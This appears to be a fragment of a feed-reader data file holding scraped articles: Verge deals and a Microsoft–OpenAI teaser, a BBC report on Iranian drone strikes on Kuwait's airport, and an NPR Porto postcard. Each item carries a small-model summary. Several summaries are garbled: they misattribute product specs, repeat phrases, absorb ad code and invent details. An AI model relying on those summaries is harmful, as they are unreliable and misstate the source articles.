+<li>You can buy<strong> two Ring Cam Indoor cameras </strong>for $49.98 (normally $99.98), making the second camera free, at <a href="https://www.amazon.com/Ring-Indoor-Cam-newest-model/dp/B0CD31RLDK">Amazon</a>. The wired 1080p cameras sport physical privacy covers that turn off audio and video recording. They also include an adjustable mount, a built-in siren, color night vision, and two-way talk. If you subscribe to a <a href="https://ring.com/plans">Ring Protect Plan</a>, which starts at $4.99 a month per device, you&#8217;ll get notifications for people, packages, and vehicles, as well as access to recorded video history.</li>
+</ul>
+						`,content_text:`Dreame’s L20 Ultra robot vacuum can clean itself. | Image: The Verge The Dreame L20 Ultra isn’t the company’s newest model, but it’s still a great robovac / mop hybrid that offers strong performance while requiring very little day-to-day maintenance thanks to its included trash bin and AI obstacle avoidance. Verge readers can get for its best-ever price right now. Originally $1,400 when it launched in 2023, it’s down to $279 from Wellbots with code L20VERGE . Dreame L20 Ultra Where to Buy: $1399.99 $279.99 at Wellbots (with code L20VERGE) What makes the L20 Ultra so great at this price is that it can do a lot on its own — so much more than other robovacs at this price point. The included base station automatically empties the vacuum’s dustbin, washes and dries the mop pads, and refills the robot’s water tank between cleaning sessions. The L20 Ultra also offers reliable AI-powered obstacle avoidance and can quickly map your home’s layout, meaning you don’t need to babysit it as it cleans. Thanks to its large dust bin, you can ignore it for up to 75 days without having to empty it yourself.\xA0 The robovac does a good job of cleaning up carpets and hardwood floors alike, thanks to its 7,000Pa of suction power. What’s more, its dual oscillating mop pads extend when needed to clean along baseboards and in corners. It can lift the mop pads over carpets, or return to its base station to have them removed. Of course, being a three-year-old robot vacuum, it lacks some of the upgrades found on newer models. For example, the $1,349.99 ($150 off) Dreame X60 — currently one of our favorite robovacs — offers a whopping 35,000Pa of suction, two rubber brushes, and a motorized swing arm that can climb over taller thresholds between rooms. Even without them, the L20 Ultra still offers a lot of premium features that aren’t typically offered at this price. window.HYPE_DESK_CONFIG = { productImageUrl: "https://platform.theverge.com/wp-content/uploads/sites/2/2026/06/corsairddr5.jpg", productImageAlt: "Corsair DDR5 Memory", productTitle: "Corsair DDR5 Memory", shortDescription: "The upgrade your PC has been waiting for.", longDescription: "If your computer has been feeling sluggish lately, your memory might be the culprit. Whether you are gaming, editing, or just someone who has too many browser tabs open at once Corsair’s DDR5 RAM is one of the easiest ways to get noticeably more out of a machine you already own. Faster load times, smoother multitasking, less waiting around while your computer catches up with you. Use code MEMORY15 for 15% off through June 15.", purchaseUrl: "https://go.corsair.com/c/482924/490888/8513?subId1=VergeHypedesk&subId2=Corsair&subId3=Article2&u=https%3A%2F%2Fwww.corsair.com%2Fus%2Fen%2Fc%2Fmemory&partnerpropertyid=7032191", purchaseLinkText: "Get The Deal At Corsair" }; Three more ways to save Through July 16th at 2:59AM ET, Prime members who are new to Audible can get three months of Audible Standard for free , a savings of roughly $27 compared to paying the regular $8.99 monthly price. The plan gives you one credit to purchase a new audiobook each month from Audible’s vast library, which includes bestsellers and classics, and they’re yours to keep forever, even if you end the subscription. You’ll be renewed at the regular $8.99 per month price unless you cancel at the end of the promotional period. Woot is selling the last-gen Bose Soundlink Flex portable Bluetooth speaker in refurbished condition for $69.99 with a one-year Bose warranty. That’s $80 less than its original retail price. The portable Bluetooth speaker isn’t all that different from the newer model, and can deliver surprisingly expansive sound quality for its size. It also boasts a rugged IP67-rated design for dust and water resistance, and it lasts up to 12 hours on a single charge. Its controls aren’t the most intuitive we’ve used, and it lacks support for higher-res AAC and aptX codecs, but we think those flaws are easy to overlook at this price. You can buy two Ring Cam Indoor cameras for $49.98 (normally $99.98), making the second camera free, at Amazon . The wired 1080p cameras sport physical privacy covers that turn off audio and video recording. They also include an adjustable mount, a built-in siren, color night vision, and two-way talk. If you subscribe to a Ring Protect Plan , which starts at $4.99 a month per device, you’ll get notifications for people, packages, and vehicles, as well as access to recorded video history.`,summary:`• Dreame's L20 Ultra robot vacuum is unbeatable at this price point due to its strong performance while requiring very little daily maintenance, including automatic dustbin, mop pad washing, water tank refilling, obstacle avoidance, AI-powered obstacle avoidance, reliable AI-powered obstacle avoidance, large dust bin, dual oscillating mop pads extending when needed to clean along baseboards and in corners, 35,000Pa of suction power, 2 rubber brushes, and a motorized swing arm that can climb over taller thresholds between rooms. It also offers premium features like three-year-old robot vacuum with a whopping 35,000Pa of suction, dual oscillating mop pads extending when needed to clean along baseboards and in corners, window.HYPE_DESK_CONFIG = { productImageUrl: "https://platform.theverge.com/wp-content/uploads/sites/2/2026/06/corsairddr5.jpg", productImageAlt: "Corsair DDR5 Memory", productTitle: "Corsair DDR5 Memory", shortDescription: "The upgrade your PC has been waiting for.", longDescription: "If your computer has been feeling sluggish lately, your memory might be the culprit. Whether you are gaming, editing, or just someone who has too many browser tabs open at once Corsair’s DDR5 RAM is one of the easiest ways to get noticeably more out of a machine you already own. Faster load times, smoother multitasking, less waiting around while your computer catches up with you. Use code MEMORY15 for 15% off through June 15.", purchaseUrl: "https://go.corsair.com/c/482924/490888/8513?subId1=VergeHypedesk&subId2=Corsair&subId3=Article2&u=https%3A%2F%2Fwww.corsair.com%2Fus%2Fen%2Fc%2Fmemory&partnerpropertyid=7032191", purchaseLinkText: "Get The Deal At Corsair" }; Three more ways to save Through July 16th at 2:59AM ET, Prime members who are new to Audible can get three months of Audible Standard for free , a savings of roughly $27 compared to paying the regular $8.99 monthly price. The plan gives you one credit to purchase a new audiobook each month from Audible’s vast library, which includes bestsellers and classics, and they're yours to keep forever, even if you end the subscription. You'll be renewed at the regular $8.99 per month price unless you cancel at the end of the promotional period. Woot is selling the last-gen Bose Soundlink Flex portable Bluetooth speaker in refurbished condition for $69. 99 with a one-year Bose warranty. That's $80 less than its original retail price. The portable Bluetooth speaker isn't all that different from the newer model, and can deliver surprisingly expansive sound quality for its size. It also boasts a rugged IP67-rated design for dust and water resistance, and it lasts up to 12 hours on a single charge.`,summary_model:`qwen2.5:0.5b`,image_url:`https://platform.theverge.com/wp-content/uploads/sites/2/2025/08/dreamel20ultra.png?quality=90&strip=all&crop=0,0,100,100`,published_at:1780498390,fetched_at:1780509343,content_hash:`712253adf14c1dd705ec64acc95d7799fd0df9a62b4286e412b0a643f89fac7d`,tags:`Deals, Gadgets, Smart Home`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:6,feed_id:3,guid:`https://www.theverge.com/?p=942242`,url:`https://www.theverge.com/ai-artificial-intelligence/942242/microsoft-build-ai-agents-openai-competition`,title:`Microsoft and OpenAI broke up —\xA0now they’re ready to fight`,author:`Hayden Field`,content_html:`
+
+						
+<figure>
+
+<img alt="Satya Nadella on a graphic background of the red, blue, green, and yellow." data-caption="" data-portal-copyright="Image: Cath Virginia / The Verge, Getty Images" data-has-syndication-rights="1" src="https://platform.theverge.com/wp-content/uploads/sites/2/2025/10/STK178_Satya_Nadella_B.jpg?quality=90&#038;strip=all&#038;crop=0,0,100,100" />
+	<figcaption>
+		</figcaption>
+</figure>
+<p class="has-drop-cap has-text-align-none">At Microsoft's annual Build conference on Tuesday, the company announced a slew of new or expanded AI initiatives, including a super app, in-house reasoning models, a cybersecurity tool, and OpenClaw-esque AI agents. All this news added up to a clear message: Microsoft is positioned to be one of the biggest players in AI, and it's finally acting like it. </p>
+<p class="has-text-align-none">For years, Microsoft's AI business leaned hard on its early and exclusive partnership with OpenAI. But the drama-filled marriage slowly devolved into a situationship, and the pair <a href="https://www.theverge.com/ai-artificial-intelligence/918981/openai-microsoft-renegotiate-contract">effectively separated</a> in late April (though Microsoft is still OpenAI's primary cloud partner - for now). This …</p>
+<p><a href="https://www.theverge.com/ai-artificial-intelligence/942242/microsoft-build-ai-agents-openai-competition">Read the full story at The Verge.</a></p>
+						`,content_text:`At Microsoft's annual Build conference on Tuesday, the company announced a slew of new or expanded AI initiatives, including a super app, in-house reasoning models, a cybersecurity tool, and OpenClaw-esque AI agents. All this news added up to a clear message: Microsoft is positioned to be one of the biggest players in AI, and it's finally acting like it. For years, Microsoft's AI business leaned hard on its early and exclusive partnership with OpenAI. But the drama-filled marriage slowly devolved into a situationship, and the pair effectively separated in late April (though Microsoft is still OpenAI's primary cloud partner - for now). This … Read the full story at The Verge.`,summary:`• Microsoft and OpenAI broke up, now they're ready to fight.`,summary_model:`qwen2.5:0.5b`,image_url:`https://platform.theverge.com/wp-content/uploads/sites/2/2025/10/STK178_Satya_Nadella_B.jpg?quality=90&strip=all&crop=0,0,100,100`,published_at:1780495440,fetched_at:1780509343,content_hash:`6a8e130c08660352c8e72eb1631bb403bc821292c4f0a4c01d8a0e9d3f329851`,tags:`AI, Analysis, Microsoft`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:49,feed_id:9,guid:`https://www.bbc.com/news/articles/c5yx135yg53o#0`,url:`https://www.bbc.com/news/articles/c5yx135yg53o?at_medium=RSS&at_campaign=rss`,title:`One killed and dozens injured in Iranian drone strikes on Kuwait airport`,content_html:`<div id="readability-page-1" class="page"><div id="bbc-main"><article><div data-testid="byline" data-component="byline-block"><p><time datetime="2026-06-03T14:02:25.433Z">4 hours ago</time></p><p><span data-testid="byline-contributors"><p><span>Jaroslav Lukiv</span><span>and</span></p><p><span>Toby Mann</span></p></span></p></div><div data-component="video-block"><figure><div orientation="landscape"><figcaption>Fire and chaos inside Kuwait airport</figcaption></div></figure></div><div data-component="text-block"><p>One person has been killed and more than 60 injured in Iranian drone strikes on Kuwait&#39;s international airport, local officials have said.</p></div><div data-component="text-block"><p>Kuwait&#39;s defence ministry spokesman called Wednesday&#39;s attack &#34;criminal Iranian aggression&#34;, while the foreign ministry said diplomatic missions had been damaged.</p></div><div data-component="text-block"><p>Iran&#39;s Islamic Revolution Guard Corps (IRGC) claimed the attack, saying it was in retaliation for US strikes on an Iranian oil tanker and Qeshm Island. Iran also said it targeted US bases in the Gulf.</p></div><div data-component="text-block"><p>The US earlier said it had launched &#34;self-defence&#34; strikes on Iran, and shot down or intercepted Iranian missiles fired at Kuwait and Bahrain.</p></div><div data-component="text-block"><p>The latest escalation threatens a shaky US-Iran ceasefire.</p></div><div data-component="text-block"><p>The person who was killed in the Iranian attack on Kuwait&#39;s airport was later identified as an Indian citizen.</p></div><div data-component="text-block"><p>In a statement, the Indian foreign ministry condemned the attack, saying that several other Indian nationals were injured. </p></div><div data-component="text-block"><p>&#34;We again call upon parties to cease such attacks,&#34; the statement added.</p></div><div data-component="text-block"><p>Following the strikes, Kuwait&#39;s foreign ministry ordered two Iranian diplomats to leave the country within 24 hours, and summoned Iran&#39;s charge d&#39;affaires.</p></div><div data-component="text-block"><p>Earlier, US Central Command (Centcom) said that its overnight strikes on Qeshm Island, in the Strait of Hormuz, were &#34;in response to attempted attacks by Iran across the Middle East&#34; and targeted an Iranian military ground control station. </p></div><div data-component="text-block"><p>It also said that the US shot down three attack drones that had been launched by Iran toward &#34;civilian mariners that were rightfully transiting regional waters&#34;. </p></div><div data-component="text-block"><p>Centcom added that Iran had fired two missiles at Kuwait and three at Bahrain, all of which broke apart or were intercepted.</p></div><div data-component="text-block"><p>Iran said it had attacked US bases and helicopters in a &#34;regional country&#34; using missiles and drones in retaliation. </p></div><div data-component="image-block"><figure><div><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20260527-122213-f92e6ec078-web-3.7.0-4/grey-placeholder.png" aria-label="image unavailable"/><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/9df3/live/72b3c3e0-5f42-11f1-89a3-d1f559421220.jpg.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/9df3/live/72b3c3e0-5f42-11f1-89a3-d1f559421220.jpg.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/9df3/live/72b3c3e0-5f42-11f1-89a3-d1f559421220.jpg.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/9df3/live/72b3c3e0-5f42-11f1-89a3-d1f559421220.jpg.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/9df3/live/72b3c3e0-5f42-11f1-89a3-d1f559421220.jpg.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/9df3/live/72b3c3e0-5f42-11f1-89a3-d1f559421220.jpg.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/9df3/live/72b3c3e0-5f42-11f1-89a3-d1f559421220.jpg.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/9df3/live/72b3c3e0-5f42-11f1-89a3-d1f559421220.jpg.webp" loading="eager" alt="Reuters People run amid smoke from a fire, in the aftermath of Iranian strikes, according to the foreign ministry, at Kuwait International Airport in Kuwait City"/><span>Reuters</span></p></div><p><figcaption>Kuwait International Airport was hit by Iranian drones, the Kuwait military said</figcaption></p></figure></div><div data-component="text-block"><p>Centcom earlier said it had struck and &#34;disabled&#34; an unladen oil tanker that was sailing towards Iran, as part of the US naval blockade on the Strait of Hormuz, which began on 13 April.</p></div><div data-component="text-block"><p>A US aircraft fired a Hellfire missile into the engine room of the Botswana-flagged M/T vessel, after its crew &#34;ignored repeated warnings&#34;, it said.</p></div><div data-component="text-block"><p>The IRGC immediately vowed retaliation, saying that &#34;disrupting the security of the Strait of Hormuz will carry a heavy price for the aggressive US military&#34;.</p></div><div data-component="text-block"><p>In Tehran, the foreign ministry said in a statement that the leaders of Kuwait and Bahrain had &#34;direct and unmistakable responsibility&#34; for &#34;last night&#39;s acts of aggression&#34;, according to AFP news agency.</p></div><div data-component="text-block"><p>Iran has repeatedly attacked targets in Bahrain and Kuwait, where US military bases are located.</p></div><div data-component="text-block"><p>The attacks happened as ceasefire negotiations between the US and Iran stalled, with a deal to end the war failing to advance over the weekend.</p></div><div data-component="image-block"><figure><div><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20260527-122213-f92e6ec078-web-3.7.0-4/grey-placeholder.png" aria-label="image unavailable"/><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/5271/live/e2a6fae0-5f5c-11f1-8b8c-6d33e1d5abb6.png.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/5271/live/e2a6fae0-5f5c-11f1-8b8c-6d33e1d5abb6.png.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/5271/live/e2a6fae0-5f5c-11f1-8b8c-6d33e1d5abb6.png.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/5271/live/e2a6fae0-5f5c-11f1-8b8c-6d33e1d5abb6.png.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/5271/live/e2a6fae0-5f5c-11f1-8b8c-6d33e1d5abb6.png.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/5271/live/e2a6fae0-5f5c-11f1-8b8c-6d33e1d5abb6.png.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/5271/live/e2a6fae0-5f5c-11f1-8b8c-6d33e1d5abb6.png.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/5271/live/e2a6fae0-5f5c-11f1-8b8c-6d33e1d5abb6.png.webp" loading="lazy" alt="Map titled “US blockade of Iran’s Gulf coast” showing Iran’s southern coastline along the Persian Gulf and the Gulf of Oman. A red-shaded coastal strip labelled “Iranian territorial waters” runs from near Kharg Island in the northwest to the Gulf of Oman in the southeast, with a bold red line marking the blockade. Purple dots indicate “ports and major jetties” along the coast, including locations near Kharg Island, Qeshm Island, and Bandar Abbas. The Strait of Hormuz is labelled between the Gulf and the Gulf of Oman. A red annotation box states: “US blockade will affect all ships travelling to or from Iran’s Gulf coast.” A small inset map highlights the region’s location in the Middle East. A scale bar shows 250 km / 100 miles, and the source is marinerregions.org, with a BBC logo at the bottom."/></p></div></figure></div><div data-component="text-block"><p>US President Donald Trump this week told his critics to <a href="https://www.bbc.com/news/articles/crlpy8n7pr6o" target="_self">&#34;sit back and relax&#34;</a>, saying that Iran &#34;really wants to make a deal, and it will be a good one for the USA&#34;.</p></div><div data-component="text-block"><p>US media earlier reported that Trump had requested edits to the terms of a potential peace deal, after meeting with senior aides to discuss extending the framework of a ceasefire. </p></div><div data-component="text-block"><p>The changes related to the Strait of Hormuz and the removal of highly enriched uranium from Iran, the BBC&#39;s US news partner CBS News reported - as well as a framework to reopen negotiations on Iran&#39;s nuclear programme.</p></div><div data-component="text-block"><p>On Monday, Iran&#39;s foreign ministry spokesman Esmail Baghaei denied this had been on the table, adding that Washington was &#34;constantly changing its views and putting forward new or contradictory demands&#34;.</p></div><div data-component="text-block"><p>In an interview aired on Wednesday, Trump said Iran had &#34;already agreed&#34; to not have a nuclear weapon.</p></div><div data-component="text-block"><p>Trump said Iran&#39;s supreme leader, Ayatollah Mojtaba Khamenei, was &#34;involved&#34; in the talks. </p></div><div data-component="text-block"><p>&#34;We seem to be getting along quite well,&#34; Trump told the Pod Force One podcast.</p></div><div data-component="text-block"><p>Asked if he would like to meet him, he said: &#34;I&#39;d like to meet him. We probably will meet at some point, depending on how it all works out.&#34;</p></div><div data-component="text-block"><p>US Secretary of State Marco Rubio told Congress on Tuesday that negotiators had not offered Iran sanctions relief in exchange for reopening the strait.</p></div><div data-component="text-block"><p>&#34;Right now, everything that&#39;s been discussed with them is that … any sanctions relief is condition-based, which means it has to be in return for the reason why those sanctions were put in place in the first place, which is their nuclear programme,&#34; he said.</p></div><div data-component="text-block"><p>&#34;The war is over,&#34; he said in another tense exchange with a senator, as lawmakers on the committee questioned the US strategy for ending the conflict.</p></div></article></div></div>`,content_text:`4 hours agoJaroslav LukivandToby MannFire and chaos inside Kuwait airportOne person has been killed and more than 60 injured in Iranian drone strikes on Kuwait's international airport, local officials have said.Kuwait's defence ministry spokesman called Wednesday's attack "criminal Iranian aggression", while the foreign ministry said diplomatic missions had been damaged.Iran's Islamic Revolution Guard Corps (IRGC) claimed the attack, saying it was in retaliation for US strikes on an Iranian oil tanker and Qeshm Island. Iran also said it targeted US bases in the Gulf.The US earlier said it had launched "self-defence" strikes on Iran, and shot down or intercepted Iranian missiles fired at Kuwait and Bahrain.The latest escalation threatens a shaky US-Iran ceasefire.The person who was killed in the Iranian attack on Kuwait's airport was later identified as an Indian citizen.In a statement, the Indian foreign ministry condemned the attack, saying that several other Indian nationals were injured. "We again call upon parties to cease such attacks," the statement added.Following the strikes, Kuwait's foreign ministry ordered two Iranian diplomats to leave the country within 24 hours, and summoned Iran's charge d'affaires.Earlier, US Central Command (Centcom) said that its overnight strikes on Qeshm Island, in the Strait of Hormuz, were "in response to attempted attacks by Iran across the Middle East" and targeted an Iranian military ground control station. It also said that the US shot down three attack drones that had been launched by Iran toward "civilian mariners that were rightfully transiting regional waters". Centcom added that Iran had fired two missiles at Kuwait and three at Bahrain, all of which broke apart or were intercepted.Iran said it had attacked US bases and helicopters in a "regional country" using missiles and drones in retaliation. ReutersKuwait International Airport was hit by Iranian drones, the Kuwait military saidCentcom earlier said it had struck and "disabled" an unladen oil tanker that was sailing towards Iran, as part of the US naval blockade on the Strait of Hormuz, which began on 13 April.A US aircraft fired a Hellfire missile into the engine room of the Botswana-flagged M/T vessel, after its crew "ignored repeated warnings", it said.The IRGC immediately vowed retaliation, saying that "disrupting the security of the Strait of Hormuz will carry a heavy price for the aggressive US military".In Tehran, the foreign ministry said in a statement that the leaders of Kuwait and Bahrain had "direct and unmistakable responsibility" for "last night's acts of aggression", according to AFP news agency.Iran has repeatedly attacked targets in Bahrain and Kuwait, where US military bases are located.The attacks happened as ceasefire negotiations between the US and Iran stalled, with a deal to end the war failing to advance over the weekend.US President Donald Trump this week told his critics to "sit back and relax", saying that Iran "really wants to make a deal, and it will be a good one for the USA".US media earlier reported that Trump had requested edits to the terms of a potential peace deal, after meeting with senior aides to discuss extending the framework of a ceasefire. The changes related to the Strait of Hormuz and the removal of highly enriched uranium from Iran, the BBC's US news partner CBS News reported - as well as a framework to reopen negotiations on Iran's nuclear programme.On Monday, Iran's foreign ministry spokesman Esmail Baghaei denied this had been on the table, adding that Washington was "constantly changing its views and putting forward new or contradictory demands".In an interview aired on Wednesday, Trump said Iran had "already agreed" to not have a nuclear weapon.Trump said Iran's supreme leader, Ayatollah Mojtaba Khamenei, was "involved" in the talks. "We seem to be getting along quite well," Trump told the Pod Force One podcast.Asked if he would like to meet him, he said: "I'd like to meet him. We probably will meet at some point, depending on how it all works out."US Secretary of State Marco Rubio told Congress on Tuesday that negotiators had not offered Iran sanctions relief in exchange for reopening the strait."Right now, everything that's been discussed with them is that … any sanctions relief is condition-based, which means it has to be in return for the reason why those sanctions were put in place in the first place, which is their nuclear programme," he said."The war is over," he said in another tense exchange with a senator, as lawmakers on the committee questioned the US strategy for ending the conflict.`,summary:`- One person has been killed and more than 60 people are injured in Iranian drone strikes on Kuwait's international airport. - The latest escalation threatens a shaky US-Iran ceasefire. - Iran claimed responsibility for the attack, saying it was in retaliation for US strikes against Iranian oil tanker and Qeshm Island.`,summary_model:`qwen2.5:0.5b`,image_url:`https://ichef.bbci.co.uk/news/1024/branded_news/9df3/live/72b3c3e0-5f42-11f1-89a3-d1f559421220.jpg`,published_at:1780495345,fetched_at:1780509343,content_hash:`39b43d413bc7cb24baf281e40d932db801b5fdf25c3c1426f4229c2ce871ed90`,is_read:!1,is_starred:!1,is_later:!0,dup_count:0},{id:38,feed_id:10,guid:`https://www.npr.org/2026/06/03/g-s1-124469/porto-portugal-linens-textiles`,url:`https://www.npr.org/2026/06/03/g-s1-124469/porto-portugal-linens-textiles`,title:`Greetings from Porto, whose lanes are lined with colorful textiles`,author:`Esme Nicholson`,content_html:`<div id="readability-page-1" class="page"><div id="storytext">
+      <div data-crop-type="" id="resg-s1-124799">
+        <picture>
+            <source srcset="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/1920x1080+0+0/resize/400/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F2a%2F5e%2Fe6a747a9476281d79bb559d30ff8%2Ffarflungpostcard-en.jpg 400w,
+https://npr.brightspotcdn.com/dims3/default/strip/false/crop/1920x1080+0+0/resize/800/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F2a%2F5e%2Fe6a747a9476281d79bb559d30ff8%2Ffarflungpostcard-en.jpg 800w,
+https://npr.brightspotcdn.com/dims3/default/strip/false/crop/1920x1080+0+0/resize/1000/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F2a%2F5e%2Fe6a747a9476281d79bb559d30ff8%2Ffarflungpostcard-en.jpg 1000w,
+https://npr.brightspotcdn.com/dims3/default/strip/false/crop/1920x1080+0+0/resize/1300/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F2a%2F5e%2Fe6a747a9476281d79bb559d30ff8%2Ffarflungpostcard-en.jpg 1300w,
+https://npr.brightspotcdn.com/dims3/default/strip/false/crop/1920x1080+0+0/resize/1600/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F2a%2F5e%2Fe6a747a9476281d79bb559d30ff8%2Ffarflungpostcard-en.jpg 1600w,
+https://npr.brightspotcdn.com/dims3/default/strip/false/crop/1920x1080+0+0/resize/2000/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F2a%2F5e%2Fe6a747a9476281d79bb559d30ff8%2Ffarflungpostcard-en.jpg 2000w,
+https://npr.brightspotcdn.com/dims3/default/strip/false/crop/1920x1080+0+0/resize/2600/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F2a%2F5e%2Fe6a747a9476281d79bb559d30ff8%2Ffarflungpostcard-en.jpg 2600w" data-template="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/1920x1080+0+0/resize/{width}/quality/{quality}/format/{format}/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F2a%2F5e%2Fe6a747a9476281d79bb559d30ff8%2Ffarflungpostcard-en.jpg" sizes="(min-width: 1300px) 1238px, (min-width: 1025px) calc(100vw - 60px), (min-width: 768px) calc(100vw - 60px), calc(100vw - 30px)" type="image/webp"/>
+            <source srcset="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/1920x1080+0+0/resize/400/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F2a%2F5e%2Fe6a747a9476281d79bb559d30ff8%2Ffarflungpostcard-en.jpg 400w,
+https://npr.brightspotcdn.com/dims3/default/strip/false/crop/1920x1080+0+0/resize/800/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F2a%2F5e%2Fe6a747a9476281d79bb559d30ff8%2Ffarflungpostcard-en.jpg 800w,
+https://npr.brightspotcdn.com/dims3/default/strip/false/crop/1920x1080+0+0/resize/1000/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F2a%2F5e%2Fe6a747a9476281d79bb559d30ff8%2Ffarflungpostcard-en.jpg 1000w,
+https://npr.brightspotcdn.com/dims3/default/strip/false/crop/1920x1080+0+0/resize/1300/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F2a%2F5e%2Fe6a747a9476281d79bb559d30ff8%2Ffarflungpostcard-en.jpg 1300w,
+https://npr.brightspotcdn.com/dims3/default/strip/false/crop/1920x1080+0+0/resize/1600/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F2a%2F5e%2Fe6a747a9476281d79bb559d30ff8%2Ffarflungpostcard-en.jpg 1600w,
+https://npr.brightspotcdn.com/dims3/default/strip/false/crop/1920x1080+0+0/resize/2000/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F2a%2F5e%2Fe6a747a9476281d79bb559d30ff8%2Ffarflungpostcard-en.jpg 2000w,
+https://npr.brightspotcdn.com/dims3/default/strip/false/crop/1920x1080+0+0/resize/2600/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F2a%2F5e%2Fe6a747a9476281d79bb559d30ff8%2Ffarflungpostcard-en.jpg 2600w" data-template="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/1920x1080+0+0/resize/{width}/quality/{quality}/format/{format}/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F2a%2F5e%2Fe6a747a9476281d79bb559d30ff8%2Ffarflungpostcard-en.jpg" sizes="(min-width: 1300px) 1238px, (min-width: 1025px) calc(100vw - 60px), (min-width: 768px) calc(100vw - 60px), calc(100vw - 30px)" type="image/jpeg"/>
+            <img src="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/1920x1080+0+0/resize/1100/quality/50/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F2a%2F5e%2Fe6a747a9476281d79bb559d30ff8%2Ffarflungpostcard-en.jpg" data-template="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/1920x1080+0+0/resize/{width}/quality/{quality}/format/{format}/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F2a%2F5e%2Fe6a747a9476281d79bb559d30ff8%2Ffarflungpostcard-en.jpg" alt="FarFlungPostcard_EN.jpg" fetchpriority="high"/>
+        </picture>
+</div>
+   <p>Linen lines the lanes of Porto&#39;s old town. Up high, fresh laundry quivers in the breeze like bunting, pegged precariously to twine stretched taut between windows. And at street level, linen scarves, cotton aprons and tea towels adorn the entrances to souvenir shops, many of which are run by Bangladeshi immigrants whose home country shares Portugal&#39;s rich tradition of textile manufacturing.</p>   <p>As I thumb the tea towels, I&#39;m struck by stark sentimentality. I think of the drawer of tea towels at home, a motley mix of mementos from my own vacations and those I&#39;ve inadvertently inherited. From William Morris-patterned linens to a faded rendering of a map marking Hadrian&#39;s Wall, to a cloth bearing the Universal Declaration of Human Rights and another claiming life begins at 40.</p>   
+   <p>Each time I take a fresh tea towel to dry dishes, I think about past conversations at various kitchen sinks with those who have held and folded these very cloths. Now, as my child helps to dry while I wash up, we&#39;re wrapped in the comfort of these washed-out rags and this domestic ritual. Before leaving the Portuguese souvenir shop, I pick out a new tea towel to pass back and forth while discussing the day — and, one day, to pass on.</p>
+</div></div>`,content_text:`Linen lines the lanes of Porto's old town. Up high, fresh laundry quivers in the breeze like bunting, pegged precariously to twine stretched taut between windows. And at street level, linen scarves, cotton aprons and tea towels adorn the entrances to souvenir shops, many of which are run by Bangladeshi immigrants whose home country shares Portugal's rich tradition of textile manufacturing.   As I thumb the tea towels, I'm struck by stark sentimentality. I think of the drawer of tea towels at home, a motley mix of mementos from my own vacations and those I've inadvertently inherited. From William Morris-patterned linens to a faded rendering of a map marking Hadrian's Wall, to a cloth bearing the Universal Declaration of Human Rights and another claiming life begins at 40.   
+   Each time I take a fresh tea towel to dry dishes, I think about past conversations at various kitchen sinks with those who have held and folded these very cloths. Now, as my child helps to dry while I wash up, we're wrapped in the comfort of these washed-out rags and this domestic ritual. Before leaving the Portuguese souvenir shop, I pick out a new tea towel to pass back and forth while discussing the day — and, one day, to pass on.`,cleaned_html:`<p>Linen lanes in Porto's old town are lined with colorful textiles. Each lane is dotted with bunting-like laundry bags, aprons, scarves, and towels adorned by Bangladeshi immigrants who share Portuguese textile history.</p><p>TITLE: Porto's Linen Lanes - A Journey Through the Local Culture</p>`,summary:`Linen lanes in Porto's old town are lined with colorful textiles, from laundry bags like bunting to scarves, aprons, and towels adorned by Bangladeshis who share Portuguese textile history.
+
+• The article describes linen lanes in Porto, Portugal.
+• It highlights the presence of colorful textiles along these lanes.
